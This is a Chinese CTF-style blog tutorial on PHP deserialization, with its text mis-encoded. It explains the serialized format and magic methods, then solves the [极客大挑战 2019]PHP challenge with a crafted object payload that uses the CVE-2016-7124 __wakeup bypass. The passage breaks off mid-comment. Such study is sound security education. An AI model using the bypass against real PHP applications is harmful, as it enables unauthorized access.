<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;123456&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$flag2</span> = <span class="string">&quot;flag&#123;753159&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$aa</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">        <span class="built_in">static</span> <span class="variable">$bb</span> = <span class="string">&quot;456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test</span> = <span class="keyword">new</span> test;</span><br><span class="line">    <span class="variable">$data</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ</p>
<p><img src="https://img.vim-cn.com/f2/00e6ed1085c1ad167d223991b9f9cc2729e9f2.png" alt="ç»“æœ"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;æŒ‡Object(å¯¹è±¡) 4ä¸ªå­—ç¬¦:test</span><br><span class="line">:2 å¯¹è±¡å±æ€§ä¸ªæ•°ä¸º2</span><br><span class="line">&#123;&#125;ä¸­ä¸ºå±æ€§å­—ç¬¦æ•°ï¼šå±æ€§å€¼</span><br><span class="line"></span><br><span class="line">å¯¹privateå˜é‡åºåˆ—åŒ–åä¼šåœ¨å˜é‡åå‰é¢åŠ å…¥ %00ç±»å%00</span><br><span class="line">å¯¹protectedå˜é‡åºåˆ—åŒ–åä¼šåœ¨å˜é‡åå‰é¢åŠ å…¥%00*%00</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$str</span>=<span class="string">&#x27;O:4:&quot;test&quot;:3:&#123;s:10:&quot;%00test%00flag&quot;;s:12:&quot;flag&#123;123456&#125;&quot;;s:8:&quot;%00*%00flag2&quot;;s:12:&quot;flag&#123;753159&#125;&quot;;s:2:&quot;aa&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>;</span><br><span class="line">	<span class="variable">$data</span> = urldecode(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$obj</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">    var_dump(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">è¿è¡Œç»“æœï¼š</span><br><span class="line"><span class="keyword">object</span>(test)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>:<span class="string">&quot;test&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;flag&#123;123456&#125;&quot;</span></span><br><span class="line">  [<span class="string">&quot;flag2&quot;</span>:<span class="keyword">protected</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;flag&#123;753159&#125;&quot;</span></span><br><span class="line">  [<span class="string">&quot;aa&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;123&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><p>åœ¨å¯¹PHPååºåˆ—åŒ–è¿›è¡Œåˆ©ç”¨æ—¶ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸€äº›é­”æœ¯æ–¹æ³•ã€‚<a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHPæ‰‹å†Œ</a></p>
<h3 id="å¸¸è§æ–¹æ³•"><a href="#å¸¸è§æ–¹æ³•" class="headerlink" title="å¸¸è§æ–¹æ³•"></a>å¸¸è§æ–¹æ³•</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) æ„é€ å‡½æ•° å½“ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºæ—¶è§¦å‘</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  ææ„å‡½æ•° å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯å‰è§¦å‘</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__toString</span>(<span class="params"></span>)  å½“ä¸€ä¸ªå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²è§¦å‘</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__sleep</span>(<span class="params"></span>)     ååºåˆ—åŒ–æ—¶è§¦å‘</span></span><br><span class="line"><span class="function">    //<span class="title">serialize</span>(<span class="params"></span>)ä¼šå…ˆæ£€æŸ¥æ˜¯å¦æœ‰<span class="title">__sleep</span>(<span class="params"></span>)ï¼Œå°†åœ¨åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)    ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘</span></span><br><span class="line"><span class="function">    //<span class="title">unserialize</span>(<span class="params"></span>) ä¼šæ£€æŸ¥æ˜¯å¦æœ‰<span class="title">__wakeup</span>(<span class="params"></span>)ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__call</span>(<span class="params"></span>)      è§¦å‘ä¸€ä¸ªæœªå®šä¹‰çš„æ–¹æ³•çš„æ—¶å€™</span></span><br><span class="line"><span class="function">    //å¿…é¡»ä¼ å…¥ä¸¤ä¸ªå˜é‡ï¼Œå‡½æ•°åå’Œå‚æ•°</span></span><br><span class="line"><span class="function">    // (<span class="params"><span class="keyword">string</span> <span class="variable">$functionName</span>, <span class="keyword">array</span> <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__callStatic</span>(<span class="params"></span>) åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__get</span>(<span class="params"></span>)       è¯»å–ä¸€ä¸ªå¯¹è±¡æ— æ³•è®¿é—®/ä¸å­˜åœ¨çš„å±æ€§çš„æ—¶å€™</span></span><br><span class="line"><span class="function">    //åœ¨ç±»ä¸­æ·»åŠ <span class="title">__get</span>(<span class="params"></span>)æ–¹æ³•ï¼Œåœ¨ç›´æ¥è·å–å±æ€§å€¼æ—¶è‡ªåŠ¨è§¦å‘ä¸€æ¬¡ï¼Œä»¥å±æ€§åä½œä¸ºå‚æ•°ä¼ å…¥å¹¶å¤„ç†</span></span><br><span class="line"><span class="function">    //å¿…é¡»æœ‰ä¸€ä¸ªä¼ å…¥å€¼</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__set</span>(<span class="params"></span>) ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__invoke</span>(<span class="params"></span>)    å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__isset</span>(<span class="params"></span>) åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨<span class="title">isset</span>(<span class="params"></span>)æˆ–<span class="title">empty</span>(<span class="params"></span>)è§¦å‘</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">__unset</span>(<span class="params"></span>) åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨<span class="title">unset</span>(<span class="params"></span>)æ—¶è§¦å‘</span></span><br></pre></td></tr></table></figure>

<h3 id="æ¯”è¾ƒé‡è¦çš„æ–¹æ³•"><a href="#æ¯”è¾ƒé‡è¦çš„æ–¹æ³•" class="headerlink" title="æ¯”è¾ƒé‡è¦çš„æ–¹æ³•"></a>æ¯”è¾ƒé‡è¦çš„æ–¹æ³•</h3><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚</span><br></pre></td></tr></table></figure>

<p>å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ï¼Œåˆ é™¤ä¸å¿…è¦çš„å±æ€§</p>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>ç›¸å…³æ¼æ´CVE-2016-7124ï¼›phpç‰ˆæœ¬ PHP&lt;5.6.25 &amp; PHP&lt;7.0.10</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç»•è¿‡æ–¹æ³•ï¼šéœ€è¦ä½¿ä¼ å…¥çš„å±æ€§ä¸ªæ•°å¤§äºçœŸå®å±æ€§ä¸ªæ•°</span><br></pre></td></tr></table></figure>

<p>é¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æºï¼Œè¿”å›voidï¼Œå¸¸ç”¨äºååºåˆ—åŒ–æ“ä½œä¸­é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œ</p>
<h5 id="æµ‹è¯•ä»£ç "><a href="#æµ‹è¯•ä»£ç " class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$sex</span>, <span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">&quot;id: %s, sex: %s, age: %d&quot;</span>, <span class="keyword">$this</span>-&gt;id, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">info</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**sleep()</span></span><br><span class="line"><span class="comment">     * serializeå‰è°ƒç”¨ ç”¨äºåˆ é€‰éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å˜é‡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>, <span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**wakeup()</span></span><br><span class="line"><span class="comment">     * unserializeå‰è°ƒç”¨ ç”¨äºé¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æº</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">&quot;id: %s, sex: %s, age: %d&quot;</span>, <span class="keyword">$this</span>-&gt;id, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = <span class="keyword">new</span> test(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;male&#x27;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span>-&gt;info();</span><br><span class="line"><span class="comment">//å­˜åœ¨__sleep(å‡½æ•°ï¼Œ$infoå±æ€§ä¸ä¼šè¢«å­˜å‚¨</span></span><br><span class="line"><span class="variable">$temp</span> = serialize(<span class="variable">$me</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$temp</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = unserialize(<span class="variable">$temp</span>);</span><br><span class="line"><span class="comment">//__wakeup()ç»„è£…çš„$info</span></span><br><span class="line"><span class="variable">$me</span>-&gt;info();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">è¿è¡Œç»“æœï¼š</span><br><span class="line">id: zhangsan, sex: male, age: <span class="number">18</span>&lt;br&gt;test::__sleep&lt;br&gt;O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;zhangsan&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;male&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">18</span>;&#125;&lt;br&gt;test::__wakeup&lt;br&gt;id: zhangsan, sex: male, age: <span class="number">18</span>&lt;br&gt;</span><br></pre></td></tr></table></figure>

<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</span><br></pre></td></tr></table></figure>

<h5 id="æµ‹è¯•ä»£ç -1"><a href="#æµ‹è¯•ä»£ç -1" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$sex</span>, <span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">&quot;id: %s, sex: %s, age: %d&quot;</span>, <span class="keyword">$this</span>-&gt;id, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = <span class="keyword">new</span> test(<span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;male&#x27;</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;__toString:&#x27;</span> . <span class="variable">$me</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">è¿è¡Œç»“æœï¼š</span><br><span class="line">__toString:id: zhangsan, sex: male, age: <span class="number">20</span>&lt;br&gt;</span><br></pre></td></tr></table></figure>



<p>æ–¹æ³•è°ƒç”¨é¡ºåºæµ‹è¯•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;aaaaaaa&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;bbbbbbb&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;__construct&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;__construct&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;__sleep&lt;br /&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;__wakeup&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åˆ›å»ºå¯¹è±¡è°ƒç”¨__construct</span></span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> test();</span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–å¯¹è±¡è°ƒç”¨__sleep</span></span><br><span class="line">    <span class="variable">$serialize</span> = serialize(<span class="variable">$object</span>);</span><br><span class="line">    <span class="comment">//è¾“å‡ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;serialize: &#x27;</span>.<span class="variable">$serialize</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–å¯¹è±¡è°ƒç”¨__wakeup</span></span><br><span class="line">    <span class="variable">$unserialize</span>=unserialize(<span class="variable">$serialize</span>);</span><br><span class="line">    <span class="comment">//è°ƒç”¨ptè¾“å‡ºæ•°æ®</span></span><br><span class="line">    <span class="variable">$unserialize</span>-&gt;pt();</span><br><span class="line">    <span class="comment">//è„šæœ¬ç»“æŸè°ƒç”¨__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">è¿è¡Œç»“æœï¼š</span><br><span class="line">__construct&lt;br /&gt;__sleep&lt;br /&gt;serialize: O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;aaaaaaa&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;bbbbbbb&quot;</span>;&#125;&lt;br /&gt;__wakeup&lt;br /&gt;aaaaaaa&lt;br /&gt;__construct&lt;br /&gt;__construct&lt;br /&gt;</span><br></pre></td></tr></table></figure>

<p>ï¼ˆæµ‹è¯•ä»£ç å‡æ¥è‡ªå¤§ä½¬åšå®¢ï¼Œå¹¶éåŸåˆ›ï¼‰</p>
<p>æµ‹è¯•é¢˜ï¼š[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</p>
<p>é¢˜ç›®å­˜åœ¨å¤‡ä»½æ–‡ä»¶<a href="http://www.zip/">www.zip</a></p>
<p>æºç ä¸ºğŸ‘‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;  <span class="comment">//private</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;         </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//wakeup æŠŠusernameå˜æˆäº†guest</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123; <span class="comment">//password éœ€è¦100</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123; <span class="comment">//username éœ€è¦æ˜¯admin</span></span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">	<span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);   <span class="comment">//unserialize selectå˜é‡</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»“åˆä¸Šè¾¹æåˆ°çš„å½¢æˆsolutionğŸ‘‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="keyword">new</span> Name());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//æ„é€ ä¸€ä¸ªç±»ä½¿å…¶æ»¡è¶³é¢˜ç›®è¦æ±‚ï¼Œæœ¬é¢˜æ¶‰åŠåˆ°äº†__wakeup()å‡½æ•°çš„ç»•è¿‡</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/**wakeup()</span></span><br><span class="line"><span class="comment">     * unserializeå‰è°ƒç”¨ ç”¨äºé¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æº</span></span><br><span class="line"><span class="comment">     åºåˆ—åŒ–ç»“æœï¼šO:4:&quot;Name&quot;:2ï¼š&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;å› usernameå’Œpasswordéƒ½ä¸ºprivateæ‰€ä»¥éœ€è¦åœ¨ç±»åä¸¤ä¾§åŠ ä¸Š%00</span></span><br><span class="line"><span class="comment">     ç»•è¿‡__wakeup()å‡½æ•°éœ€è¦ä½¿ä¼ å…¥çš„å±æ€§ä¸ªæ•°å¤§äºçœŸå®å±æ€§ä¸ªæ•°ï¼ˆæ‰€ä»¥payloadä¸­çš„æ˜¯3è€Œä¸æ˜¯åºåˆ—åŒ–åçš„åˆ°çš„2</span></span><br><span class="line"><span class="comment">     